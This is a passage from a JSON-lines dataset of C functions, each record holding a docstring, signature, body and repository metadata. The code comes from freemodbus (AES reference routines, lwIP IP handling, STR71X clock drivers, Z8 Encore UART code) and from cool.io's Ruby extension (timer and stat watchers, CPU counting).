(ROUNDS+1)*BC); j++, t++) {\n            ((int *) W[t/BC])[t%BC] = ((int *) tk)[j];\n        }\n    }\n}", "path": "freemodbus/demo/ATSAM3S/libraries/drivers/utility/encryption/aes_reference.c", "commit_date": "2018-09-13 00:00:00", "repo_name": "cwalter-at/freemodbus", "stars": 659, "license": "None", "language": "c", "size": 2769}
{"docstring": "/**\n * Simple interface to ip_output_if. It finds the outgoing network\n * interface and calls upon ip_output_if to do the actual work.\n */\n", "func_signal": "err_t\nip_output(struct pbuf *p, struct ip_addr *src, struct ip_addr *dest,\n          u8_t ttl, u8_t tos, u8_t proto)", "code": "{\n  struct netif *netif;\n\n  if ((netif = ip_route(dest)) == NULL) {\n    LWIP_DEBUGF(IP_DEBUG | 2, (\"ip_output: No route to 0x%\"X32_F\"\\n\", dest->addr));\n\n    IP_STATS_INC(ip.rterr);\n    snmp_inc_ipoutdiscards();\n    return ERR_RTE;\n  }\n\n  return ip_output_if(p, src, dest, ttl, tos, proto, netif);\n}", "path": "freemodbus/demo/STR71XTCP/lwip/src/core/ipv4/ip.c", "commit_date": "2018-09-13 00:00:00", "repo_name": "cwalter-at/freemodbus", "stars": 659, "license": "None", "language": "c", "size": 2769}
{"docstring": "/*******************************************************************************\n* Function Name  : RCCU_RCLKSourceConfig\n* Description    : Selects the RCLK source clock\n* Input          : New_Clock ( RCCU_PLL1_Output, RCCU_CLOCK2_16, RCCU_CLOCK2 )\n* Return         : None\n*******************************************************************************/\n", "func_signal": "void RCCU_RCLKSourceConfig ( RCCU_RCLK_Clocks New_Clock )", "code": "{\n  switch ( New_Clock )\n  {\n    case RCCU_CLOCK2    :{// Resets the CSU_Cksel bit in clk_flag\n                             RCCU->CFR &= ~RCCU_CSU_CKSEL_Mask;\n                          // Set the CK2_16 Bit in the CFR\n                             RCCU->CFR |= RCCU_CK2_16_Mask;\n                          // Deselect The CKAF\n                             RCCU->CCR   &= ~RCCU_CKAF_SEL_Mask;\n                           // switch off the PLL1\n                              RCCU->PLL1CR=((RCCU->PLL1CR & ~RCCU_DX_Mask)\\\n                              |0x00000003) & ~RCCU_FREEN_Mask;\n                              break;}\n    case RCCU_CLOCK2_16  :{// ReSet the CK2_16 Bit in the CFR\n                              RCCU->CFR &= ~RCCU_CK2_16_Mask;\n                           // Deselect The CKAF\n                              RCCU->CCR   &= ~RCCU_CKAF_SEL_Mask;\n                           // switch off the PLL1\n                              RCCU->PLL1CR=((RCCU->PLL1CR & ~RCCU_DX_Mask)\\\n                              |0x00000003) & ~RCCU_FREEN_Mask;\n                              break;}\n    case RCCU_PLL1_Output:{// Set the CK2_16 Bit in the CFR\n                              RCCU->CFR = RCCU->CFR | RCCU_CK2_16_Mask;\n                           // Waits the PLL1 to lock if DX bits are different from '111'\n                           // If all DX bit are set the PLL lock flag in meaningless\n                              if (( RCCU->PLL1CR & 0x0007 ) != 7)\n                                while(!(RCCU->CFR & RCCU_LOCK_Mask));\n                           // Deselect The CKAF\n                              RCCU->CCR  &= ~RCCU_CKAF_SEL_Mask;\n                           // Select The CSU_CKSEL\n                              RCCU->CFR |= RCCU_CSU_CKSEL_Mask;\n                              break;}\n    case RCCU_RTC_CLOCK  :   {RCCU->CCR |= 0x04;\n                              break;}\n  }\n}", "path": "freemodbus/demo/STR71X/library/rccu.c", "commit_date": "2018-09-13 00:00:00", "repo_name": "cwalter-at/freemodbus", "stars": 659, "license": "None", "language": "c", "size": 2769}
{"docstring": "/* ----------------------- Start implementation -----------------------------*/\n", "func_signal": "void\nvMBPortSerialEnable( BOOL xRxEnable, BOOL xTxEnable )", "code": "{\n    /* If xRXEnable enable serial receive interrupts. If xTxENable enable\n     * transmitter empty interrupts.\n     */\n    if( xRxEnable )\n    {\n        IRQ0ENL |= UART0_RXD_INT_EN_L;\n    }\n    else\n    {\n        IRQ0ENL &= ~UART0_RXD_INT_EN_L;\n    }\n    if( xTxEnable )\n    {\n        IRQ0ENL |= UART0_TXD_INT_EN_L;\n        /* Force Tx Interruption */\n        IRQ0 |= UART0_TXD_INT_PENDING;\n    }\n    else\n    {\n        IRQ0ENL &= ~UART0_TXD_INT_EN_L;\n    }\n}", "path": "freemodbus/demo/Z8ENCORE/port/portserial.c", "commit_date": "2018-09-13 00:00:00", "repo_name": "cwalter-at/freemodbus", "stars": 659, "license": "None", "language": "c", "size": 2769}
{"docstring": "/*******************************************************************************\n* Function Name  : RCCU_USBClockSource\n* Description    : Gets the RCLK source clock\n* Input          : None\n* Return         : RCCU_USB_Clocks ( RCCU_PLL2_Output, RCCU_USBCK )\n*******************************************************************************/\n", "func_signal": "RCCU_USB_Clocks RCCU_USBClockSource ( void )", "code": "{\n  if ((PCU->PLL2CR & RCCU_USBEN_Mask ) >> RCCU_USBEN_Index == 1 )\n     return RCCU_PLL2_Output;\n  else return RCCU_USBCK;\n}", "path": "freemodbus/demo/STR71X/library/rccu.c", "commit_date": "2018-09-13 00:00:00", "repo_name": "cwalter-at/freemodbus", "stars": 659, "license": "None", "language": "c", "size": 2769}
{"docstring": "/*******************************************************************************\n* Function Name  : RCCU_PLL2Config\n* Description    : Configures the PLL2 div & mul factors.\n* Input          : New_Mul ( RCCU_PLL2_Mul_12, RCCU_PLL2_Mul_16, RCCU_PLL2_Mul_20, \n*                  RCCU_Mul_PLL2_28 )\n*                : New_Div ( RCCU_Div_1, RCCU_Div_2, RCCU_Div_3, RCCU_Div_4,\n*                  RCCU_Div_5, RCCU_Div_6, RCCU_Div_7)\n* Return         : None\n*******************************************************************************/\n", "func_signal": "void RCCU_PLL2Config ( RCCU_PLL2_Mul New_Mul, RCCU_PLL_Div New_Div )", "code": "{\n  u32 Tmp = ( PCU->PLL2CR & ~RCCU_MX_Mask ) | ( New_Mul << RCCU_MX_Index );\n  PCU->PLL2CR = ( Tmp & ~RCCU_DX_Mask ) | ( New_Div  | RCCU_FREEN_Mask );\n}", "path": "freemodbus/demo/STR71X/library/rccu.c", "commit_date": "2018-09-13 00:00:00", "repo_name": "cwalter-at/freemodbus", "stars": 659, "license": "None", "language": "c", "size": 2769}
{"docstring": "//------------------------------------------------------------------------------\n/// Converts an ASCII hexadecimal representation to a raw binary one\n/// \\param ASCII value\n/// \\param Buffer to store binary value\n/// \\param Size of value\n//------------------------------------------------------------------------------\n", "func_signal": "static void ASCII2RawHex(const unsigned char * ascii, \n                         unsigned char * binary, \n                         unsigned int length)", "code": "{\n    unsigned char * ptr;\n    unsigned int i;\n\n    ptr = (unsigned char *) binary;\n    for (i=0; i < length; i++, ptr++, ascii++) {\n        if (*ascii >= 'A') {\n            *ptr = *ascii - 'A' + 10;\n        }\n        else {\n            *ptr = *ascii - '0';\n        }\n        *ptr <<= 4;\n        ascii++;\n        if (*ascii >= 'A') {\n            *ptr += *ascii - 'A' + 10;\n        }\n        else {\n            *ptr += *ascii - '0';\n        }\n    }\n}", "path": "freemodbus/demo/ATSAM3S/libraries/drivers/utility/encryption/aes_reference.c", "commit_date": "2018-09-13 00:00:00", "repo_name": "cwalter-at/freemodbus", "stars": 659, "license": "None", "language": "c", "size": 2769}
{"docstring": "/*\n * Create an interrupt handler for the receive interrupt for your target\n * processor. This function should then call pxMBFrameCBByteReceived( ). The\n * protocol stack will then call xMBPortSerialGetByte( ) to retrieve the\n * character.\n */\n", "func_signal": "static void interrupt\nprvvUARTRxISR( void )", "code": "{\n    UCHAR           tmp;\n\n    /* Verify UART error flags */\n    if( U0STAT0 & UART_ERRORS )\n    {\n        tmp = U0D;\n    }\n    else\n    {\n        pxMBFrameCBByteReceived(  );\n    }\n\n    IRQ0 &= ~UART0_RXD_INT_PENDING;\n}", "path": "freemodbus/demo/Z8ENCORE/port/portserial.c", "commit_date": "2018-09-13 00:00:00", "repo_name": "cwalter-at/freemodbus", "stars": 659, "license": "None", "language": "c", "size": 2769}
{"docstring": "//------------------------------------------------------------------------------\n/// XOR text and round key together\n/// \\param Plain text\n/// \\param Round key\n//------------------------------------------------------------------------------\n", "func_signal": "static inline void addRoundKey(unsigned char a[BC][4], const unsigned char rk[BC][4])", "code": "{\n    unsigned int i;\n\n    for (i=0; i < BC; i++) {\n        ((int *) a)[i] ^= ((int *) rk)[i];\n    }\n}", "path": "freemodbus/demo/ATSAM3S/libraries/drivers/utility/encryption/aes_reference.c", "commit_date": "2018-09-13 00:00:00", "repo_name": "cwalter-at/freemodbus", "stars": 659, "license": "None", "language": "c", "size": 2769}
{"docstring": "//------------------------------------------------------------------------------\n/// Multiply two elements of GF(2^m) needed for MixColumn and InvMixColumn\n/// \\param a first element\n/// \\param b second element\n/// \\return  result of operation\n//------------------------------------------------------------------------------\n", "func_signal": "static unsigned char mul(unsigned char a, unsigned char b)", "code": "{\n    if (a && b) {\n        return Alogtable[(Logtable[a] + Logtable[b])%255];\n    }\n    else {\n        return 0;\n    }\n}", "path": "freemodbus/demo/ATSAM3S/libraries/drivers/utility/encryption/aes_reference.c", "commit_date": "2018-09-13 00:00:00", "repo_name": "cwalter-at/freemodbus", "stars": 659, "license": "None", "language": "c", "size": 2769}
{"docstring": "/**\n * This function is called by the network interface device driver when\n * an IP packet is received. The function does the basic checks of the\n * IP header such as packet size being at least larger than the header\n * size etc. If the packet was not destined for us, the packet is\n * forwarded (using ip_forward). The IP checksum is always checked.\n *\n * Finally, the packet is sent to the upper layer protocol input function.\n * \n * \n * \n */\n", "func_signal": "err_t\nip_input(struct pbuf *p, struct netif *inp)", "code": "{\n  struct ip_hdr *iphdr;\n  struct netif *netif;\n  u16_t iphdrlen;\n\n  IP_STATS_INC(ip.recv);\n  snmp_inc_ipinreceives();\n\n  /* identify the IP header */\n  iphdr = p->payload;\n  if (IPH_V(iphdr) != 4) {\n    LWIP_DEBUGF(IP_DEBUG | 1, (\"IP packet dropped due to bad version number %\"U16_F\"\\n\", IPH_V(iphdr)));\n    ip_debug_print(p);\n    pbuf_free(p);\n    IP_STATS_INC(ip.err);\n    IP_STATS_INC(ip.drop);\n    snmp_inc_ipunknownprotos();\n    return ERR_OK;\n  }\n  /* obtain IP header length in number of 32-bit words */\n  iphdrlen = IPH_HL(iphdr);\n  /* calculate IP header length in bytes */\n  iphdrlen *= 4;\n\n  /* header length exceeds first pbuf length? */\n  if (iphdrlen > p->len) {\n    LWIP_DEBUGF(IP_DEBUG | 2, (\"IP header (len %\"U16_F\") does not fit in first pbuf (len %\"U16_F\"), IP packet droppped.\\n\",\n      iphdrlen, p->len));\n    /* free (drop) packet pbufs */\n    pbuf_free(p);\n    IP_STATS_INC(ip.lenerr);\n    IP_STATS_INC(ip.drop);\n    snmp_inc_ipindiscards();\n    return ERR_OK;\n  }\n\n  /* verify checksum */\n#if CHECKSUM_CHECK_IP\n  if (inet_chksum(iphdr, iphdrlen) != 0) {\n\n    LWIP_DEBUGF(IP_DEBUG | 2, (\"Checksum (0x%\"X16_F\") failed, IP packet dropped.\\n\", inet_chksum(iphdr, iphdrlen)));\n    ip_debug_print(p);\n    pbuf_free(p);\n    IP_STATS_INC(ip.chkerr);\n    IP_STATS_INC(ip.drop);\n    snmp_inc_ipindiscards();\n    return ERR_OK;\n  }\n#endif\n\n  /* Trim pbuf. This should have been done at the netif layer,\n   * but we'll do it anyway just to be sure that its done. */\n  pbuf_realloc(p, ntohs(IPH_LEN(iphdr)));\n\n  /* match packet against an interface, i.e. is this packet for us? */\n  for (netif = netif_list; netif != NULL; netif = netif->next) {\n\n    LWIP_DEBUGF(IP_DEBUG, (\"ip_input: iphdr->dest 0x%\"X32_F\" netif->ip_addr 0x%\"X32_F\" (0x%\"X32_F\", 0x%\"X32_F\", 0x%\"X32_F\")\\n\",\n      iphdr->dest.addr, netif->ip_addr.addr,\n      iphdr->dest.addr & netif->netmask.addr,\n      netif->ip_addr.addr & netif->netmask.addr,\n      iphdr->dest.addr & ~(netif->netmask.addr)));\n\n    /* interface is up and configured? */\n    if ((netif_is_up(netif)) && (!ip_addr_isany(&(netif->ip_addr))))\n    {\n      /* unicast to this interface address? */\n      if (ip_addr_cmp(&(iphdr->dest), &(netif->ip_addr)) ||\n         /* or broadcast on this interface network address? */\n         ip_addr_isbroadcast(&(iphdr->dest), netif)) {\n        LWIP_DEBUGF(IP_DEBUG, (\"ip_input: packet accepted on interface %c%c\\n\",\n          netif->name[0], netif->name[1]));\n        /* break out of for loop */\n        break;\n      }\n    }\n  }\n#if LWIP_DHCP\n  /* Pass DHCP messages regardless of destination address. DHCP traffic is addressed\n   * using link layer addressing (such as Ethernet MAC) so we must not filter on IP.\n   * According to RFC 1542 section 3.1.1, referred by RFC 2131).\n   */\n  if (netif == NULL) {\n    /* remote port is DHCP server? */\n    if (IPH_PROTO(iphdr) == IP_PROTO_UDP) {\n      LWIP_DEBUGF(IP_DEBUG | DBG_TRACE | 1, (\"ip_input: UDP packet to DHCP client port %\"U16_F\"\\n\",\n        ntohs(((struct udp_hdr *)((u8_t *)iphdr + iphdrlen))->dest)));\n      if (ntohs(((struct udp_hdr *)((u8_t *)iphdr + iphdrlen))->dest) == DHCP_CLIENT_PORT) {\n        LWIP_DEBUGF(IP_DEBUG | DBG_TRACE | 1, (\"ip_input: DHCP packet accepted.\\n\"));\n        netif = inp;\n      }\n    }\n  }\n#endif /* LWIP_DHCP */\n  /* packet not for us? */\n  if (netif == NULL) {\n    /* packet not for us, route or discard */\n    LWIP_DEBUGF(IP_DEBUG | DBG_TRACE | 1, (\"ip_input: packet not for us.\\n\"));\n#if IP_FORWARD\n    /* non-broadcast packet? */\n    if (!ip_addr_isbroadcast(&(iphdr->dest), inp)) {\n      /* try to forward IP packet on (other) interfaces */\n      ip_forward(p, iphdr, inp);\n    }\n    else\n#endif /* IP_FORWARD */\n    {\n      snmp_inc_ipindiscards();\n    }\n    pbuf_free(p);\n    return ERR_OK;\n  }\n  /* packet consists of multiple fragments? */\n  if ((IPH_OFFSET(iphdr) & htons(IP_OFFMASK | IP_MF)) != 0) {\n#if IP_REASSEMBLY /* packet fragment reassembly code present? */\n    LWIP_DEBUGF(IP_DEBUG, (\"IP packet is a fragment (id=0x%04\"X16_F\" tot_len=%\"U16_F\" len=%\"U16_F\" MF=%\"U16_F\" offset=%\"U16_F\"), calling ip_reass()\\n\",\n      ntohs(IPH_ID(iphdr)), p->tot_len, ntohs(IPH_LEN(iphdr)), !!(IPH_OFFSET(iphdr) & htons(IP_MF)), (ntohs(IPH_OFFSET(iphdr)) & IP_OFFMASK)*8));\n    /* reassemble the packet*/\n    p = ip_reass(p);\n    /* packet not fully reassembled yet? */\n    if (p == NULL) {\n      return ERR_OK;\n    }\n    iphdr = p->payload;\n#else /* IP_REASSEMBLY == 0, no packet fragment reassembly code present */\n    pbuf_free(p);\n    LWIP_DEBUGF(IP_DEBUG | 2, (\"IP packet dropped since it was fragmented (0x%\"X16_F\") (while IP_REASSEMBLY == 0).\\n\",\n      ntohs(IPH_OFFSET(iphdr))));\n    IP_STATS_INC(ip.opterr);\n    IP_STATS_INC(ip.drop);\n    snmp_inc_ipunknownprotos();\n    return ERR_OK;\n#endif /* IP_REASSEMBLY */\n  }\n\n#if IP_OPTIONS == 0 /* no support for IP options in the IP header? */\n  if (iphdrlen > IP_HLEN) {\n    LWIP_DEBUGF(IP_DEBUG | 2, (\"IP packet dropped since there were IP options (while IP_OPTIONS == 0).\\n\"));\n    pbuf_free(p);\n    IP_STATS_INC(ip.opterr);\n    IP_STATS_INC(ip.drop);\n    snmp_inc_ipunknownprotos();\n    return ERR_OK;\n  }\n#endif /* IP_OPTIONS == 0 */\n\n  /* send to upper layers */\n  LWIP_DEBUGF(IP_DEBUG, (\"ip_input: \\n\"));\n  ip_debug_print(p);\n  LWIP_DEBUGF(IP_DEBUG, (\"ip_input: p->len %\"U16_F\" p->tot_len %\"U16_F\"\\n\", p->len, p->tot_len));\n\n#if LWIP_RAW\n  /* raw input did not eat the packet? */\n  if (raw_input(p, inp) == 0) {\n#endif /* LWIP_RAW */\n\n  switch (IPH_PROTO(iphdr)) {\n#if LWIP_UDP\n  case IP_PROTO_UDP:\n  case IP_PROTO_UDPLITE:\n    snmp_inc_ipindelivers();\n    udp_input(p, inp);\n    break;\n#endif /* LWIP_UDP */\n#if LWIP_TCP\n  case IP_PROTO_TCP:\n    snmp_inc_ipindelivers();\n    tcp_input(p, inp);\n    break;\n#endif /* LWIP_TCP */\n  case IP_PROTO_ICMP:\n    snmp_inc_ipindelivers();\n    icmp_input(p, inp);\n    break;\n  default:\n    /* send ICMP destination protocol unreachable unless is was a broadcast */\n    if (!ip_addr_isbroadcast(&(iphdr->dest), inp) &&\n        !ip_addr_ismulticast(&(iphdr->dest))) {\n      p->payload = iphdr;\n      icmp_dest_unreach(p, ICMP_DUR_PROTO);\n    }\n    pbuf_free(p);\n\n    LWIP_DEBUGF(IP_DEBUG | 2, (\"Unsupported transport protocol %\"U16_F\"\\n\", IPH_PROTO(iphdr)));\n\n    IP_STATS_INC(ip.proterr);\n    IP_STATS_INC(ip.drop);\n    snmp_inc_ipunknownprotos();\n  }\n#if LWIP_RAW\n  } /* LWIP_RAW */\n#endif\n  return ERR_OK;\n}", "path": "freemodbus/demo/STR71XTCP/lwip/src/core/ipv4/ip.c", "commit_date": "2018-09-13 00:00:00", "repo_name": "cwalter-at/freemodbus", "stars": 659, "license": "None", "language": "c", "size": 2769}
{"docstring": "/* ------------------------ Implementation -------------------------------- */\n", "func_signal": "void\nmain( void )", "code": "{\n    ( void )xTaskCreate( vModbusTask, NULL, configMINIMAL_STACK_SIZE, NULL,\n                         tskIDLE_PRIORITY, NULL );\n    /* Now all the tasks have been started - start the scheduler. */\n\n    vTaskStartScheduler(  );\n}", "path": "freemodbus/demo/MCF5235CW/demo.c", "commit_date": "2018-09-13 00:00:00", "repo_name": "cwalter-at/freemodbus", "stars": 659, "license": "None", "language": "c", "size": 2769}
{"docstring": "/*******************************************************************************\n* Function Name  : RCCU_FrequencyValue\n* Description    : Calculates & Returns any internal RCCU clock frequency\n*                  passed in parametres\n* Input          : RCCU_Clocks ( RCCU_CLK2, RCCU_RCLK, RCCU_MCLK, RCCU_PCLK, RCCU_FCLK )\n* Return         : u32\n*******************************************************************************/\n", "func_signal": "u32 RCCU_FrequencyValue ( RCCU_Clocks Internal_Clk )", "code": "{\n  u32 Tmp;\n  u8 Div = 0;\n  u8 Mul = 0;\n  RCCU_RCLK_Clocks CurrentRCLK;\n\n  Tmp = ( RCCU_Div2Status() == SET )? RCCU_Main_Osc / 2 :  RCCU_Main_Osc;\n\n  if ( Internal_Clk == RCCU_CLK2 )\n  {\n   Div = 1;\n   Mul = 1;\n  }\n  else\n  { CurrentRCLK = RCCU_RCLKClockSource ();\n    switch ( CurrentRCLK ){\n      case RCCU_CLOCK2_16 : Div = 16;\n                            Mul = 1;\n                            break;\n      case RCCU_CLOCK2    : Div = 1;\n                            Mul = 1;\n                            break;\n      case RCCU_PLL1_Output :{Mul=(RCCU->PLL1CR & RCCU_MX_Mask ) >> RCCU_MX_Index;\n                              switch ( Mul )\n                              {case 0: Mul = 20; break;\n                               case 1: Mul = 12; break;\n                               case 2: Mul = 24; break;\n                               case 3: Mul = 16; break;\n                              }\n                              Div = ( RCCU->PLL1CR & RCCU_DX_Mask ) + 1;\n                              break;}\n     case RCCU_RTC_CLOCK :  Mul = 1;\n                            Div = 1;\n                            Tmp = RCCU_RTC_Osc;\n                            break;}}\n\n  switch ( Internal_Clk ){\n      case RCCU_MCLK :{Div <<= PCU->MDIVR & RCCU_FACT_Mask;\n                       break;}\n      case RCCU_PCLK :{Div <<=(PCU->PDIVR & RCCU_FACT2_Mask ) >> RCCU_FACT2_Index;\n                       break;}\n      case RCCU_FCLK :{Div <<=  PCU->PDIVR & 0x3;\n                       break;}}\n\n  return (Tmp * Mul) / Div;\n}", "path": "freemodbus/demo/STR71X/library/rccu.c", "commit_date": "2018-09-13 00:00:00", "repo_name": "cwalter-at/freemodbus", "stars": 659, "license": "None", "language": "c", "size": 2769}
{"docstring": "/*******************************************************************************\n* Function Name  : RCCU_RCLKClockSource\n* Description    : Returns the current RCLK source clock\n* Input          : None\n* Return         : RCCU_PLL1_Output, RCCU_CLOCK2_16, RCCU_CLOCK2, RCCU_RTC_CLOCK\n*******************************************************************************/\n", "func_signal": "RCCU_RCLK_Clocks RCCU_RCLKClockSource ( void )", "code": "{\n  if ((RCCU->CCR & 0x04)==0x04)\n    return RCCU_RTC_CLOCK;\n\n  else if ((RCCU->CFR & RCCU_CK2_16_Mask)==0)\n    return RCCU_CLOCK2_16;\n\n  else if (RCCU->CFR & RCCU_CSU_CKSEL_Mask)\n    return RCCU_PLL1_Output;\n\n  else\n    return RCCU_CLOCK2;\n}", "path": "freemodbus/demo/STR71X/library/rccu.c", "commit_date": "2018-09-13 00:00:00", "repo_name": "cwalter-at/freemodbus", "stars": 659, "license": "None", "language": "c", "size": 2769}
{"docstring": "/*******************************************************************************\n* Function Name  : RCCU_PLL1Config\n* Description    : Configures the PLL1 div & mul factors.\n* Input          : New_Mul ( RCCU_PLL1_Mul_12, RCCU_PLL1_Mul_16, RCCU_PLL1_Mul_20,\n*                  RCCU_PLL1_Mul_24 )\n*                : New_Div ( RCCU_Div_1, RCCU_Div_2, RCCU_Div_3, RCCU_Div_4,\n*                  RCCU_Div_5, RCCU_Div_6, RCCU_Div_7)\n* Return         : None\n*******************************************************************************/\n", "func_signal": "void RCCU_PLL1Config ( RCCU_PLL1_Mul New_Mul, RCCU_PLL_Div New_Div )", "code": "{\n  u32 Tmp = ( RCCU->PLL1CR & ~RCCU_MX_Mask ) | ( New_Mul << RCCU_MX_Index );\n  RCCU->PLL1CR = ( Tmp & ~RCCU_DX_Mask ) | New_Div | 0x40;\n}", "path": "freemodbus/demo/STR71X/library/rccu.c", "commit_date": "2018-09-13 00:00:00", "repo_name": "cwalter-at/freemodbus", "stars": 659, "license": "None", "language": "c", "size": 2769}
{"docstring": "/**\n *  call-seq:\n *    Coolio::Utils.ncpus -> Integer\n * \n * Return the number of CPUs in the present system\n */\n", "func_signal": "static VALUE Coolio_Utils_ncpus(VALUE self)", "code": "{\n  int ncpus = 0;\n\n#ifdef HAVE_LINUX_PROCFS\n#define HAVE_COOLIO_UTILS_NCPUS\n  char buf[512];\n  FILE *cpuinfo;\n  \n  if(!(cpuinfo = fopen(\"/proc/cpuinfo\", \"r\")))\n    rb_sys_fail(\"fopen\");\n\n  while(fgets(buf, 512, cpuinfo)) {\n    if(!strncmp(buf, \"processor\", 9))\n      ncpus++;\n  }\n#endif\n\n#ifdef HAVE_SYSCTLBYNAME\n#define HAVE_COOLIO_UTILS_NCPUS\n  size_t size = sizeof(int);\n\n  if(sysctlbyname(\"hw.ncpu\", &ncpus, &size, NULL, 0)) \n    return INT2NUM(1);\n#endif\n\n#ifndef HAVE_COOLIO_UTILS_NCPUS\n  rb_raise(rb_eRuntimeError, \"operation not supported\");\n#endif\n\n  return INT2NUM(ncpus);\n}", "path": "cool.io/ext/cool.io/utils.c", "commit_date": "2020-09-23 00:00:00", "repo_name": "socketry/cool.io", "stars": 694, "license": "mit", "language": "c", "size": 940}
{"docstring": "/*\n * Coolio::StatWatcher lets you create either one-shot or periodic stats which\n * run within Coolio's event loop.  It's useful for creating timeouts or\n * events which fire periodically.\n **/\n", "func_signal": "void Init_coolio_stat_watcher()", "code": "{\n  mCoolio = rb_define_module(\"Coolio\");\n  cCoolio_Watcher = rb_define_class_under(mCoolio, \"Watcher\", rb_cObject);\n  cCoolio_StatWatcher = rb_define_class_under(mCoolio, \"StatWatcher\", cCoolio_Watcher);\n  cCoolio_StatInfo = rb_struct_define(\"StatInfo\",\n      \"mtime\",\n      \"ctime\",\n      \"atime\",\n      \"dev\",\n      \"ino\",\n      \"mode\",\n      \"nlink\",\n      \"uid\",\n      \"guid\",\n      \"rdev\",\n      \"size\",\n      \"blksize\",\n      \"blocks\",\n      NULL);\n  cCoolio_Loop = rb_define_class_under(mCoolio, \"Loop\", rb_cObject);\n\n  rb_define_method(cCoolio_StatWatcher, \"initialize\", Coolio_StatWatcher_initialize, -1);\n  rb_define_method(cCoolio_StatWatcher, \"attach\", Coolio_StatWatcher_attach, 1);\n  rb_define_method(cCoolio_StatWatcher, \"detach\", Coolio_StatWatcher_detach, 0);\n  rb_define_method(cCoolio_StatWatcher, \"enable\", Coolio_StatWatcher_enable, 0);\n  rb_define_method(cCoolio_StatWatcher, \"disable\", Coolio_StatWatcher_disable, 0);\n  rb_define_method(cCoolio_StatWatcher, \"on_change\", Coolio_StatWatcher_on_change, 2);\n  rb_define_method(cCoolio_StatWatcher, \"path\", Coolio_StatWatcher_path, 0);\n}", "path": "cool.io/ext/cool.io/stat_watcher.c", "commit_date": "2015-11-14 00:00:00", "repo_name": "socketry/cool.io", "stars": 694, "license": "mit", "language": "c", "size": 940}
{"docstring": "/**\n *  call-seq:\n *    Coolio::TimerWatcher.attach(loop) -> Coolio::TimerWatcher\n * \n * Attach the timer watcher to the given Coolio::Loop.  If the watcher is already\n * attached to a loop, detach it from the old one and attach it to the new one.\n */\n", "func_signal": "static VALUE Coolio_TimerWatcher_attach(VALUE self, VALUE loop)", "code": "{\n  ev_tstamp interval, timeout;\n  struct Coolio_Loop *loop_data;\n  struct Coolio_Watcher *watcher_data;\n    \n  if(!rb_obj_is_kind_of(loop, cCoolio_Loop))\n    rb_raise(rb_eArgError, \"expected loop to be an instance of Coolio::Loop, not %s\", RSTRING_PTR(rb_inspect(loop)));\n\n  Data_Get_Struct(loop, struct Coolio_Loop, loop_data);\n  Data_Get_Struct(self, struct Coolio_Watcher, watcher_data);\n\n  if(watcher_data->loop != Qnil)\n    Coolio_TimerWatcher_detach(self);\n\n  watcher_data->loop = loop;\n  \n  /* Calibrate timeout to account for potential drift */\n\tinterval = NUM2DBL(rb_iv_get(self, \"@interval\"));\n  timeout = interval + ev_time() - ev_now(loop_data->ev_loop);\n  \n  ev_timer_set(\n    &watcher_data->event_types.ev_timer, \n    timeout, \n    rb_iv_get(self, \"@repeating\") == Qtrue ? interval : 0\n  );\n\n  ev_timer_start(loop_data->ev_loop, &watcher_data->event_types.ev_timer);\n\trb_call_super(1, &loop);\n\n  return self;  \n}", "path": "cool.io/ext/cool.io/timer_watcher.c", "commit_date": "2017-11-19 00:00:00", "repo_name": "socketry/cool.io", "stars": 694, "license": "mit", "language": "c", "size": 940}
{"docstring": "/* Coolio::Loop dispatch callback */\n", "func_signal": "static void Coolio_StatWatcher_dispatch_callback(VALUE self, int revents)", "code": "{\n  struct Coolio_Watcher *watcher_data;\n  Data_Get_Struct(self, struct Coolio_Watcher, watcher_data);\n\n  VALUE previous_statdata = Coolio_StatInfo_build(&watcher_data->event_types.ev_stat.prev);\n  VALUE current_statdata = Coolio_StatInfo_build(&watcher_data->event_types.ev_stat.attr);\n  rb_funcall(self, rb_intern(\"on_change\"), 2, previous_statdata, current_statdata);\n}", "path": "cool.io/ext/cool.io/stat_watcher.c", "commit_date": "2015-11-14 00:00:00", "repo_name": "socketry/cool.io", "stars": 694, "license": "mit", "language": "c", "size": 940}
{"docstring": "/**\n *  call-seq:\n *    Coolio::TimerWatcher.initialize(interval, repeating = false) -> Coolio::TimerWatcher\n * \n * Create a new Coolio::TimerWatcher for the given IO object and add it to the \n * given Coolio::Loop.  Interval defines a duration in seconds to wait for events,\n * and can be specified as an Integer or Float.  Repeating is a boolean \n * indicating whether the timer is one shot or should fire on the given \n * interval.\n */\n", "func_signal": "static VALUE Coolio_TimerWatcher_initialize(int argc, VALUE *argv, VALUE self)", "code": "{\n\tVALUE interval, repeating;\n  struct Coolio_Watcher *watcher_data;\n\n\trb_scan_args(argc, argv, \"11\", &interval, &repeating);\n  interval = rb_convert_type(interval, T_FLOAT, \"Float\", \"to_f\");\n\n  rb_iv_set(self, \"@interval\", interval);\n  rb_iv_set(self, \"@repeating\", repeating);\n\n  Data_Get_Struct(self, struct Coolio_Watcher, watcher_data);\n\n  watcher_data->dispatch_callback = Coolio_TimerWatcher_dispatch_callback;\n  ev_timer_init(\n      &watcher_data->event_types.ev_timer, \n      Coolio_TimerWatcher_libev_callback, \n      NUM2DBL(interval), \n      repeating == Qtrue ? NUM2DBL(interval) : 0\n  );  \n  watcher_data->event_types.ev_timer.data = (void *)self;\n\n  return Qnil;\n}", "path": "cool.io/ext/cool.io/timer_watcher.c", "commit_date": "2017-11-19 00:00:00", "repo_name": "socketry/cool.io", "stars": 694, "license": "mit", "language": "c", "size": 940}
{"docstring": "/**\n *  call-seq:\n *    Coolio::StatWatcher.enable -> Coolio::StatWatcher\n *\n * Re-enable a stat watcher which has been temporarily disabled.  See the\n * disable method for a more thorough explanation.\n */\n", "func_signal": "static VALUE Coolio_StatWatcher_enable(VALUE self)", "code": "{\n  Watcher_Enable(stat, self);\n\n  return self;\n}", "path": "cool.io/ext/cool.io/stat_watcher.c", "commit_date": "2015-11-14 00:00:00", "repo_name": "socketry/cool.io", "stars": 694, "license": "mit", "language": "c", "size": 940}
{"docstring": "/*\n * Assorted utility routines\n */\n", "func_signal": "void Init_coolio_utils()", "code": "{\n  mCoolio = rb_define_module(\"Coolio\");\n  cCoolio_Utils = rb_define_module_under(mCoolio, \"Utils\");\n\n  rb_define_singleton_method(cCoolio_Utils, \"ncpus\", Coolio_Utils_ncpus, 0);\n  rb_define_singleton_method(cCoolio_Utils, \"maxfds\", Coolio_Utils_maxfds, 0);\n  rb_define_singleton_method(cCoolio_Utils, \"maxfds=\", Coolio_Utils_setmaxfds, 1);\n}", "path": "cool.io/ext/cool.io/utils.c", "commit_date": "2020-09-23 00:00:00", "repo_name": "socketry/cool.io", "stars": 694, "license": "mit", "language": "c", "size": 940}
